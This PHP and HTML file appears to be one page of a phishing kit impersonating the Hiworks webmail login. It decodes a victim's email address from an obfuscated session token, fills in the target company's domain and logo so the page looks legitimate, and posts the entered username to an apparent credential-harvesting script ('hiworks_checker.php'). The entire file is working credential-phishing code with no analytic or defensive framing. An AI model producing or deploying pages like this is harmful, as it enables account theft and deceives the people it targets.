<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html lang="ko">

<head>
  <meta http-equiv="Content-Language" content="en-us">
  <meta charset="UTF-8" />
  <link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>&#54616;&#51060;&#50893;&#49828; &#47196;&#44536;&#51064;</title>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #676767;
  font-weight: 700;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  font-color:#000; 
  font-size:16px; 
  padding:0; 
  box-shadow:none; 
  height:40px; 
  width:100%; 
  border-radius:0px; 
  border:none; 
  padding: 8 15px;!important; 
  line-height: 18px; 
  border-bottom:1px #2985db solid; 
  border-top: 1px #2985db solid; 
  border-left: 1px #2985db solid;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  background-color: white;
  background-image: url("img/id.png");
  background-position: 1px 2px; 
  background-repeat: no-repeat;
  padding: 10px 35px;
  }
  input[type=text]:focus {
  outline: none;
  border: nono;  
  box-shadow:none;
  border-bottom:1px #2985db solid; 
  border-top: 1px #2985db solid; 
  border-left: 1px #2985db solid;
  }
  p{
  font-size: 14px;
  text-align: center;
  }
  h1{
  font-weight: 700;
  font-size: 24px;
  text-align: center;
  }
</style>
<body>

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td>
		<div align="center">
			<table border="0" width="100" cellspacing="0" cellpadding="0">
				<tr>
					<td>
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
				  <form action="hiworks_checker.php" method="post">
					<tr>
						<td height="110"></td>
					</tr>
					<tr>
						<td height="40">
						<p align="center">
						<img src="https://logo.clearbit.com/<?php echo $ddomain;?>" width="200" height="40">
                        </td>
					</tr>
					<tr>
						<td height="70"></td>
					</tr>
					<tr>
						<td height="26">
						<h1><font color="#000000" face="Arial">Sign in to</font> <font color="#7A7A7A"><?php echo $ddomain;?></font></h1></td>
					</tr>
					<tr>
						<td height="4"></td>
					</tr>
					
					<tr>
						<td height="14">
						<p>Please enter your username.</p></td>
					</tr>
					<tr>
						<td height="40"></td>
					</tr>
					<tr>
						<td width="400" height="40">
	                                        <div class="input-group">
						   <input name="user" value="" placeholder="Username" type="text" required class="form-control" id="usr" >
                                                   <input type="hidden" name="domain" value="@<?php echo $ddomain;?>" >
                                                   <span style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@<?php echo $ddomain;?></span>
                                                </div>										
						</td>
					</tr>
					<tr>
						<td height="20"></td>
					</tr>
					<tr>
						<td>
						<input type="image" src="img/signin-btn.png" width="400" height="44" name="I1"></td>
					</tr>
					<tr>
						<td height="15"></td>
					</tr>
					<tr>
						<td height="15">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
					<tr>
						<td height="122" background="img/footer-2.png">
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td height="36">
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="8"></td>
										<td width="155">
										<p align="left">
										<a href="session_login.php" style="text-decoration: none; color: black; " >
										<font color="#2985db" size="2" face="Arial Unicode MS">
										Sign in with another office</font></a></td>
										<td height="20"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="86"></td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="2"></td>
					</tr>
					</table>
						</td>
					</tr>
					</form>
				</table>
					</td>
				</tr>
			</table>
		</div>
		</td>
	</tr>
	
	<tr>
		<td>
		
		</td>
	</tr>
		
</table>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>